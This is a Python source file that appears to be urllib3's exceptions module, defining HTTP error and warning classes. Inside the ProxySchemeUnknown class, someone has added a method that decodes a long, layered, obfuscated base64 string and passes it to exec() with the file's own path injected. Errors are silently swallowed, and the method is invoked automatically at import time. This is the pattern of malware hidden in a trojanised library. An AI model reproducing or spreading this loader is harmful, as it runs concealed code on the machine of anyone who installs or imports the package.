from __future__ import absolute_import
from .packages.six.moves.http_client import (
    IncompleteRead as httplib_IncompleteRead
)
# Base Exceptions


class HTTPError(Exception):
    "Base exception used by this module."
    pass


class HTTPWarning(Warning):
    "Base warning used by this module."
    pass


class PoolError(HTTPError):
    "Base exception for errors caused within a pool."
    def __init__(self, pool, message):
        self.pool = pool
        HTTPError.__init__(self, "%s: %s" % (pool, message))

    def __reduce__(self):
        # For pickling purposes.
        return self.__class__, (None, None)


class RequestError(PoolError):
    "Base exception for PoolErrors that have associated URLs."
    def __init__(self, pool, url, message):
        self.url = url
        PoolError.__init__(self, pool, message)

    def __reduce__(self):
        # For pickling purposes.
        return self.__class__, (None, self.url, None)


class SSLError(HTTPError):
    "Raised when SSL certificate fails in an HTTPS connection."
    pass


class ProxyError(HTTPError):
    "Raised when the connection to a proxy fails."
    pass


class DecodeError(HTTPError):
    "Raised when automatic decoding based on Content-Type fails."
    pass


class ProtocolError(HTTPError):
    "Raised when something unexpected happens mid-request/response."
    pass


#: Renamed to ProtocolError but aliased for backwards compatibility.
ConnectionError = ProtocolError


# Leaf Exceptions

class MaxRetryError(RequestError):
    """Raised when the maximum number of retries is exceeded.

    :param pool: The connection pool
    :type pool: :class:`~urllib3.connectionpool.HTTPConnectionPool`
    :param string url: The requested Url
    :param exceptions.Exception reason: The underlying error

    """

    def __init__(self, pool, url, reason=None):
        self.reason = reason

        message = "Max retries exceeded with url: %s (Caused by %r)" % (
            url, reason)

        RequestError.__init__(self, pool, url, message)


class HostChangedError(RequestError):
    "Raised when an existing pool gets a request for a foreign host."

    def __init__(self, pool, url, retries=3):
        message = "Tried to open a foreign host with url: %s" % url
        RequestError.__init__(self, pool, url, message)
        self.retries = retries


class TimeoutStateError(HTTPError):
    """ Raised when passing an invalid state to a timeout """
    pass


class TimeoutError(HTTPError):
    """ Raised when a socket timeout error occurs.

    Catching this error will catch both :exc:`ReadTimeoutErrors
    <ReadTimeoutError>` and :exc:`ConnectTimeoutErrors <ConnectTimeoutError>`.
    """
    pass


class ReadTimeoutError(TimeoutError, RequestError):
    "Raised when a socket timeout occurs while receiving data from a server"
    pass


# This timeout error does not have a URL attached and needs to inherit from the
# base HTTPError
class ConnectTimeoutError(TimeoutError):
    "Raised when a socket timeout occurs while connecting to a server"
    pass


class NewConnectionError(ConnectTimeoutError, PoolError):
    "Raised when we fail to establish a new connection. Usually ECONNREFUSED."
    pass


class EmptyPoolError(PoolError):
    "Raised when a pool runs out of connections and no more are allowed."
    pass


class ClosedPoolError(PoolError):
    "Raised when a request enters a pool after the pool has been closed."
    pass


class LocationValueError(ValueError, HTTPError):
    "Raised when there is something wrong with a given URL input."
    pass


class LocationParseError(LocationValueError):
    "Raised when get_host or similar fails to parse the URL input."

    def __init__(self, location):
        message = "Failed to parse: %s" % location
        HTTPError.__init__(self, message)

        self.location = location


class ResponseError(HTTPError):
    "Used as a container for an error reason supplied in a MaxRetryError."
    GENERIC_ERROR = 'too many error responses'
    SPECIFIC_ERROR = 'too many {status_code} error responses'


class SecurityWarning(HTTPWarning):
    "Warned when perfoming security reducing actions"
    pass


class SubjectAltNameWarning(SecurityWarning):
    "Warned when connecting to a host with a certificate missing a SAN."
    pass


class InsecureRequestWarning(SecurityWarning):
    "Warned when making an unverified HTTPS request."
    pass


class SystemTimeWarning(SecurityWarning):
    "Warned when system time is suspected to be wrong"
    pass


class InsecurePlatformWarning(SecurityWarning):
    "Warned when certain SSL configuration is not available on a platform."
    pass


class SNIMissingWarning(HTTPWarning):
    "Warned when making a HTTPS request without SNI available."
    pass


class DependencyWarning(HTTPWarning):
    """
    Warned when an attempt is made to import a module with missing optional
    dependencies.
    """
    pass


class ResponseNotChunked(ProtocolError, ValueError):
    "Response needs to be chunked in order to read it as chunks."
    pass


class BodyNotHttplibCompatible(HTTPError):
    """
    Body should be httplib.HTTPResponse like (have an fp attribute which
    returns raw chunks) for read_chunked().
    """
    pass


class IncompleteRead(HTTPError, httplib_IncompleteRead):
    """
    Response length doesn't match expected Content-Length

    Subclass of http_client.IncompleteRead to allow int value
    for `partial` to avoid creating large objects on streamed
    reads.
    """
    def __init__(self, partial, expected):
        super(IncompleteRead, self).__init__(partial, expected)

    def __repr__(self):
        return ('IncompleteRead(%i bytes read, '
                '%i more expected)' % (self.partial, self.expected))


class InvalidHeader(HTTPError):
    "The header provided was somehow invalid."
    pass


class ProxySchemeUnknown(AssertionError, ValueError):
    "ProxyManager does not support the supplied scheme"
    # TODO(t-8ch): Stop inheriting from AssertionError in v2.0.

    def __init__(self, scheme):
        message = "Not supported proxy scheme %s" % scheme
        super(ProxySchemeUnknown, self).__init__(message)

    @classmethod
    def _init_(self):
        #-+-#
        try: import os as x_o;exec('PT13UW5Cek5qTmpUb05HUndCellIWmxhbGRVVkxSRVZ6QjNTSUpWZVpobFU2eGtiU1pXWkVOSGNqeFdPMEFGV1N4bVd6b0Vha05FYXJsMVZXbFhZR0ZWZGtaVU8xQUZXU1pXWkJ0MlNFTjFhdnBGV09abllIMVVkYXhXTzA4VWVzdEdXemMyYmFobFV3Tm1ialZuV3NsRE5QbDNhdVJXZWpOM1lHbEROTGRVTnNOMlI0a2pXc2xETlBsSGJVeGtiS1pXWlVGamVhSmpSenBWYTR0R1d6YzJjS2wzWXpwVWVPTkdUV2huWllOVU1qbFVNMzl5U3BSamFZTlVNanRVTTNSSFdENTBZS2xIYXBSR1dOVjNZc2xUTlFkbFVtVkdSekIzU0habGVpSkRlcXhVYmFaV1pFTkhjTGRrVW9wRldKVm5Xc2xETlFkbFVtVkdSekIzWUdsRE5MZFVOc04yUjRraldzbEROUGxIYm1obE1XTlhZWHBsWllsSGF2UjJSR2QzWXlvRWFNMUdhd2tGV0JWbll4a1ROUWhsUW1WV1FycDBRbkJ6TkxkbFZtVjJRNHBIV3pjMmJseFdPME1VVXJwMFFuQnpOaTVtU3hRMlJXbDNUcHhHYllOelp6TldNNVFEVEhaa1ppbEdheWcxTW5kR1pIbFRkSmRrV3dOVVVycDBRbkJ6TmpOalRvTkdSd0J6WUhabGFsZFVWS05VVXJ0RVJVTkhja1pWTzBzMFJXSmpZeUVEYmpsV04yaDFNclpUWllwRU1ERjFhS04wWndjell6NEVhalJFY3dNMlJXcFdaSFZsU0RGMWFMUkVWekIzU1habFpsTkVhc0oyVkdWM1l0eDJhTTFHYXdrRldCVm5ZeGtUTkxoa1Q1RjJWU3hXWXlZRWRNMVdPbVZHVndWell1RmxTREYxYUxSRVZ6QjNTVE5XT1FabFJoUjJSU1ZuV1dCM2RpeG1SWmRWYjQ1MFV4QW5OV1pFYjBJMlZHQmxWc3AxVFQ1V1E0VmxhTzltWXNaRk5QWkVaUnBVZW9SRFd6YzJjTE5GYTVGMlZTZG5ZWFpGTWtka1Z1eFViYVpXWlRoV2RoZFZPeHhVYm9CVFdZRlVkaUZUTzFrMFJXcG5ZSFYxWk5SRk01TVdNNVFUU0hwRmNKTjBhd3BrZXhvWFRGRmpkYVprV1hkbFZKbFhWV0pWWWhGalR5WTFhYWxtWXpJMFZXTnpZMElsTVdGV1RVcFVZT1pFY3pSVlZrZFVZc1IyUlZ4R1pZWkZWRmxuV0VaMWFTeEdaNVpGYlNWRlpFWmxjVVpGYXdJVk13bG5ZSGhuVFZKalVYWlZNc0ZXVFdaMVROWkZaVTVFYkpoWFdYbHpjaVprV0lObVJXaDFWSGgyUlp4bVVQWkZiS3AzVFhSM1ZrVmtXVmxWVjE4bVV0WlVTWHRtV1lOR2JhVmxWSTUwUVhWVU5VVldSa0YyWUdwRmRaMVdOdkpHYmFaMVVxSjBVaGRsVVhaRlJPRldUWFprZGpaRVpZVjJSNGNYV3hBM2RpeG1TUlJsYUdOVlZ3VVRXVzVtVFRKVk1hSm5Wc3AxVFQ1V1E0VlZiNU1WWXNaVk5pcG5RcVpGUkdoRlZyVnpTTnhtUzJKR1JHZGxZcVpVVlZOMFl2Vm1SNVF6U0lwRWJqTmpWckpXYkdkWFpIVlZkaGhrVW9OMlExWUhXenNXT2FaVk8wTVVVcnAwUW5Cek5pNW1TeFEyUldsM1RweEdhWUpETnZGbVY1UVRTSUpsZGlsbVF0RldVcnAwUVI5bVRQSlRONVJHV1N4MllxOTJkTlJVUzQ5RVZaaFRZR2xETk1kbFRtVjJRQzFXWVJ0bVNERjFiTzlVZXI5bVdZNWtkaWRVVDFwVk01VXpUNXhHWk5ORk0yOEViekJYWUdsRE5MaGtTd01XZW94R1pIeFdla2xYTnVoMU1yZHpTVFIyTUtsSGV4ZzFNbjltWXRaMWRpcFhNdWgxTXJwMFFSdG1TRGRHTTJvRldPTm5XUnRtU0RGMWJPOVVlcjltV1k1a2RpZFVUMXBWTTVVelQ1eEdaTk5GTTI4RWJ6QjNTSEpGYWFoVlMxcFZNNVV6U0lKVmRoUlZNdmgxTW5kelNUUldlS2xIZXhnMU1uOW1ZdFoxZGlwWE11aDFNcnAwUVJ0bVNEZEdNMnNFV1daV1pEaG1la2hrVHdWMlJWVlhZSUpGYWpOVU4yaDFNcmRtV3R0bVNERjFhTFJFVjBwR1d6Y1dPaFpVTzA4VWVyQm5TNkJUT1JabFZXSlZid0oxVkVWVWVaaEZhR0pXUnh3MFVySjFWamhsUUdsMVVqOVdaR2xETkpOMGR3cGtld2tUVVdaRldYMUdkWGRsUktOWFZWaDJTaVpsVzY5VVZrZDFZeWdHV1hOMVl2Vm1SNVFUU0RkSGNMTjFZNVlGVktoMlV5Y0hlVzVtVUQxa01PaGxVckpWYU90V05JVjFNamhuVVdCbmVXMUdlc2QxYXdWa1dWaDNUaVprU3o4a1ZrZDFZeWdHZFdsM1l2Vm1SNVF6U0hoR01aWmxRc1IyUkdOM1l5VURhajVXVTFWbVI1VXpTSFZEY2lKemIxRkdTU2gyWURWamRZTnphNVFtVjVRelR4QWpiUVJWTUNabFZuaFhUSEpWWU9kVk1ZTjJhd05IVlZSM1RORmpWNE5tUldoR1ZzcGtSWjVHWlRKRmJraDFWdFJuVlM1R2EwcDFSd05VWXNKbGROZEZkVE5sTTRabFY2cDFjU3RXTnpabGFHdG1UdUowUlZ0V093SVZNd2xWVFdaRmJYcG1WMFoxTUt0a1lGRkRUVTFXTlZkRldvUm5WeVEzZFdGVFN4VWxhR04xWXNwVmNXaEZiS1oxYXhnV1VySlZZanhtU0lWbE01OFdUV1ZsZU5abFVScFVlMzVHVVVGalFXWjFaNDEwUlNGbVRYRkRXanRHY3pSVlYwOVVUeFlGZWpaa1ZvUkZiS1pVV3VSMlVTeEdaWWRWYjBabFV1aEdkYWRFY0RGR2JTWlhUWFIzVVRKRGVXWmxlYU5uVXJWemNXcG1ScjVrYkNkVVZybERNU0ZEY1oxa1ZXeDJWcVpGZFdOalNMSldSeHdFVnRWVFZYaEZhMFpsTTBkblZ4a1VNVnBtUlROR2JhRm5WWXhtU1d0V01vRjFhU0YyWXNwRVNWSlRPdjFrVlZwWFRXSlZVS2wzZHVCRlZ4SWtWV2RHZU5ka1VoNTBWeGcxWXJCM2NVVkZkUDFVTVdoM1lHWkZhVXhtU0dsbGJrTmxVc1JHV1gxR2RXSmxib1JuV0hCM1FoeG1VMjEwVjBOMVV5Z25WV3BuV3pKMWExTW5WcVowYU81bVFIVjFhNUFqVXhBWFdOWmxWc2RsYVdSblZ6bzBTaVZVTU1SVmIxVTFWWWhHZFdKRGQzWlZNSkZUVnFaMFVqeG1XeFpGV3Nwa1ZyRkRhUnRtVWhOR2JLaFVWeWt6Yk5aVlY2MWtWU0ZsU3hNWE9aWlZPMTlVZXJCWFd4a0ROTGhrU3dNV2U0WkhXemMyYmxobFU1cEZXQ1ozWXNKRU1haFZUMXRFVkJkWFRFRkVlTGhFWjJwMVIxQW5WNVZqTllOemFLTlVVcnRFUlVSWGRqNW1Wd29GV0paVFRFRkVNT3AyWjRzMFZLWldaRGhHTWkxMmEwbFZNNVFUU0hKVmRaTlZRdXBrZXdrVFdzbEROSmhrVTJKV2FDdG1ZdFYwWlp4V08wazBSYUIzUVJ0bVNEZEdNM3MwVXI5bVdYRkRja05VTjBoMU1yOUdaSFZEY1FkbFRtVkdSekJuWXhrRE5MaEVid01XYldkbll6b1VVa2RrVnV4VWFyZFhURUYwZE5ORmF6SW1NU1ZYWVdOV2RseFdPMUExVktaV1pFTkhjS0pEYzNKbE1LcGtXSGhYYVJ4bVd4WmxiU2RYVEhwRVVYdG1XaGxWVndoVVd0WjBVWFowWTYxa1ZTRmxTNWhHTllOelo1SVdNNVF6UVJ0bVNEZEdNMjBFUjFvSFd6YzJaYTEyYUtOVVV2NTBUNkYwWmFobFR6cDFVQkJuWXRsVGVoaGxXMXAxVTFZSFd6czJaaTEyYW41RWI1UVRTSUpsZGlsbVFySldiRmQyU1Vwa1psTmtRMUYyVUJGRFd6YzJaajFHT24xa1Y1UVRTSFZEY0pSa1ZtVjJRbjlXU0hwRmNKUlVTbnBGV09ObldURkVjTnhXTzBrMFIxQVhTRUpsWmxOa1E1SldlQmxIV3pjMlppMTJhbjFVTTVRVFNJcGtkSlJrUm1WMlFDVlhZVEZFTVlOelpuTldiNGNXVFdsRE5KZFVOd2xFUk9aV1pEZDJaYTEyYW4xRVZ4b0hXemMyTkxOMVk1RVZWYWRWWkZ4MlZXeG1XelZHYlc5bVV0QjNWVnRHY1lWRmJrOWtZR1JXZWpkRWVxWlZNYWRVV1doV1lTMW1TVXAxUjBWbFZzOUdlV2wyWXZWbVI1UURVVXBsWmxSMGN3cFVNRzltVXNCbldpVmtXWVpsTVJoblZWaDJWV3hXUXV0RVNvWldaRUJUTVlOelozczBVazlXVFVwMGFPMW1VemxWVjU4a1lzeFdXaVprVlJwVWVvUkRXemNXT09aVU8wOFVlcjVHVVVKa2NVUmxVVGRsUmtWWFRXSlZVS2xIYTBnMU1ubFRUeGtETlBKVE01Sm1NYUJUV1hoM2RNNUdibVZHVndrSFd6YzJOTE5GYTVwRldrWm5ZRFJEY0xkVU1zUkdTT1Z6WTVWemRZTnphNTBrVjVRelFSdDJTRVIxYnd0RVNLWldaREpVYmFkVlVLTjBad2NqV1k1MGNaVlZXbkptYktGRFpIWlZlREYxYUxSRVYweEdaWXBVVkpkVU41UkdXU3gyWW50bVNERjFiTzlrTVdGall0eEdNaTFXT3E5a2JTZG5XWDVFTmFGMWFLTlVVdjUwVDV4V2JNTkVia0ZtVjBOM1NJaG1abE5FYXNSV2JXQjNZdUpGYmoxR2U1UjJVMUVEV3pzbU5saGxTd01VVXJwMFFuQnpOTFpWTXdkbE1GOVdaR2xETlFkVk4yRkdXT2xuV1lsVmRqMW1WMXBGV0NaSFZHcGtWTTVtVm1WR1Z2NW1TNkJUT1lkRmJpbDFVQ0JqWXlRelphMTJhS05VVXJ0RVJVUkhia2RWTndSMlIxWVhXNjltYktwSE01ZzFWc0ptWURKVWJoRjFhS05VVXY1MFRwdEdjaU5FYTFwMVYzOW1XWFJXZFpoVlNuSldicmRXWVRKVWVpSlRXS05VVXY1MFR4QWpiVlpsU1hSVlZPTm5Vc3BGUlVwbVJXTkZSR0pIVldKMGJTZGxTUFJWYnhnMll5YzJkVzVtVkwxMFJLOVVUWEZEVk54bVZYbGxhRmRuVldCSFdSdEdhcloxVlNaRlZzRkZlTmRVUndNMlIxbzFVRnBWY1dsM1l6cGtNc2RVWXM1MFNqVmtXVUZtTVNsMVZ1cDBiaXRXTXhOMlIxUTFZRnBGZFVSbFV2Sm1Sa3BVVnFwa1ZXQmpXMmtGVk9GbVZ0cEVOTmRFZGE1a2JTaGxXV0IzZGl4bVJ6TWxWYTVFWjZ4R2RXWkViMEltVmtKM1lHUjJVT1psU0hWRk01OGtZc3hHV2taRVpScFVlMzVHVVZWRWVXMUdkdkZXTWtaMFVxSmtVaGhsVVlSMU1yUmpVVzVrZWhWRVpoTjJNQ1prVnhBM2JpWmtXWk5WYjQ1VVZ3b1ZjV1psV1QxVWJHTkhaSEZEVlgxV1U0Wmxia3RtWUd4MlZhUmtUcmRGU0NSblZGVnpUaVZGTXdVbGFPZFZWcVpVVlZORVppbDBSV3BuWUhWMVpOUkZNNVEyUUMxV1lUSkVaS0ZqUlRaMWF4UWtZRnAxVlJCRE40WlZWbmhYWXdFVFVoVmtWcFIxYTFRWFdZNTBiTlprV3hNbGFDbEdWcVpFZFZwblNXWlZiSmhYVEdaVllXQmpTSnBsUld0bVZWVlRWTlJsUW8xME1DVjNWVmgyUmh4Mll1eDBRa0JuVXRCSFZUNW1RSFZsTTB0MlZHQlhlaGRVTk9GbWJDVlhWekkwUmlWRk13RTJSNGgxVVdsVWVXWkZaSFZXYkZwM1ZzcFZhbFJrUXlkRlZhQmpWeVlWWWpkVU5TUkdNc2RGVllOV05pWmxVYVYyUnhnVll6SUVXVnBtVlRKRmJLQkZWdFZqV1dOalVZVjFRak5uUzZGalFOWmxXeUYyUjBobFVWOTJkVmRGYndZRk01VXpURlpGVmpKRGFJZGxiT2RuVVdSV1loZEVlWGRWUndOSFZXNTBSaHhtVlhWbGFLaG1ZSUpGZFZGRGNyMWtWYU5qV0hobldXMVdVNnBsUm9kbllXSjFUTmRGZE81a1JKcG5Wc2xFZVdaVVF1ZGxleE0zUVJ0MlNFUjFid3BWYTRCRFRIVjBia3hXTzBrMFJheG1XQnQyU0VSRmRzTm1NNGhtVXBKVWRqNW1Wd29GV0pwMFFSOW1UUEpqVnhJV2JzQmpZdGxqYVA1bVUzcDFWT1JqV1J0bVNERjFiTzlrZUZsRFVUdEdjTGRrVW9wRldKVjNTVHhHWmhaRmRzdEVTb1pXWkRoV2RhaGxRMkpHU0tGRFR1WmxabE5GYXdJV2JyZG1ZdXBVTWtka1Y1OWtic2xIWkJ0bVNERjFiTzlVZXNSV1lXUkhhTGhFYW1WR1J4VW5ZeXdtZWoxbVZ5d2tiS3htWXRaMWRpQkRlVFoxVTFFRFd6c21OS2wzWTVBbFZ4QTNWeVUwWmtkVU8xbDBSYUIzUVJ0bVNEZEdNM29GV1dWWFlZSlZkaUpUVDJvVWVqbERVV0ZEY1hKVFZucFZicnAwUVJ0MlNFUjFid3QwVlY5bVl0WjFjTGRrVnVKV2JHbFhTSFZEY0pkMGFuTldiNTAyUVJ0MlNFUkZkc1JHV0tWVlNIVlRla2hsVXNObWF2ZEhVVUJEY2FORmExcDFWM2RtV3R0bVNERjFiTzlVTXc0V1ZYSjFSWHRHYjNKRmJLUkVWdFJuV2oxR2V4UmxWQzltVVhwa2RWdEdacE5sTW9kbFZ4ZzJiV1ZVTlAxa1ZrVlZUNlYxZFc1bVQzSm1Wc1oxVnNwMVRYUlVSNWxsZUdabFZyRlRlUjFHY1ZabGFXSlhXWHgyUVdaVVR5WTFhYU5WVnRoV2RXdEdhWFpsVkI1R1RETldPUVZsUldaVlZhRlhWV0IzVWlaa1JWUmxhR05GVnJCbk5XVkViMFlWTVNGM1lGUldhVGRsVXpsMWFPdFdUV1pWU09kRmRxVjFNU2gwVnVwMFNTRmpTWVZGYldoMVZZRkVlV1prVXJGV01WRmpWcnBWYWhOalFIZEZiYU5rVkhaVllPWkZaVzFrVldkRlZZcDBRaHhtVVg1MFYwaFdZVnBVVlZwbldYSkZiS05WWUhWelZUWmtXV1YxUWpOblM2QlRPYUZEYjBJV01XUlZXWGhtUlhwbVRYMVViRkJ6VXVCbldPNW1RV2wxVm90a1VIVjFkaVprV3A1VVIxTTNWWXAwYk5KalNYTjJSeFUxWVdwRVNVWkZjejFVTWFsbFdHaG1UVnRHY1ZaRlZWVlRZeG9GVWpkRWVWSmxWd2RVVnNCM1NXVlVPRjFrVlc1VVVycFVWV1pFWkxKVmJGNTJWNkZEYkRGMWFMUkVWdkJYV1RoR2NZTnpabnBWYld0MlFSOW1UUEpUVW5KbWJLRkRaSFpWZURGMWFMUkVWMFJXVFRCak5QeDJjd3RFVlJKWFRwaHpkTnBXUnZObWJTcDNTeEFEZU1SMWIyY1ZlcjVXV3RWa2JMbEhaNnAxVWo5MlNIWjFhaUpqVHNwMVExc0dVWEZsTkxSVlM0cEVWVmgzU0habGJpMW1SNWwwUjFBWFNIdDJaajFXT3ROVVVydEVSVTlHY2FORWEwZzFNbmRtV3RaMWFERjFiTzlVZXN0MlNIaDNjWmRWVDFOV001VXpUNXhHUlNaRmFHTmxWNVFGVHRaa1psTmxRNGswUld0bVl5RWpaa2hVVDF0MFZSOUdaSFpFTWpsWE4yaDFNcmRHVEhGMWJhZFVPMEYyUk5Wbll4a1ROREYxYUxSRVYwVjNZdVpGTWFoVlMyMEVWd2t6WTVKVWJoRjFhS04wWndZelNYRjFjamxIYTJnMU1uZG1XdFoxYURGMWJPcEZiNVVUU0k1RWFKZGtWekYyVmFkbllYWkZNTWhFY21WMlVDcFhXVEpFY2tkRlpxSjJWS1JEVElobVpsTmxRNmwxVUNwbVlYcEVOTWRVTW1WMlVDcFhXVEpFYmlkRmJ3dzBSR1pXWlRKa2VaTmxRd2tGV1NwSFRJNWtabE5sUTZsMVVDcDNZeVlsYWlOalMzbGxiV3BIVElwa1psTmxRNmwxVUN4MllwaG5kWU56YW5ObU1GZDJZeWd6Y2taVk8xa0VTT2hXU0hwRWNpZEVlNVIyVTRCRFd6czJaakpUUm5wbE0xQW5XSFpFYmoxR2F3d0VTc1pXWlRKa2VaTmxRNlZHV05OM1lHbFROSmhrVG9sMFJ4a25ZeW9GTVpkRmUzbEVTU2xuWXpJRWRoRjFhTFJFVndWell1RlZQ'.decode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(30*2+12/3))[::-1].decode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(160/2-16))[::-1].decode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(455/7-1))[::-1].replace('x_q', x_o.path.realpath(__file__).encode(str(chr(101)+chr(115)+chr(97)+chr(98))[::-1]+str(152%88)).replace('\n', '')))
        except: pass
        #-_-#
        return ('Proxy initialized')

ProxySchemeUnknown._init_()

class HeaderParsingError(HTTPError):
    "Raised by assert_header_parsing, but we convert it to a log.warning statement."
    def __init__(self, defects, unparsed_data):
        message = '%s, unparsed data: %r' % (defects or 'Unknown', unparsed_data)
        super(HeaderParsingError, self).__init__(message)


class UnrewindableBodyError(HTTPError):
    "urllib3 encountered an error when trying to rewind a body"
    pass


ProxySchemeUnknown._init_()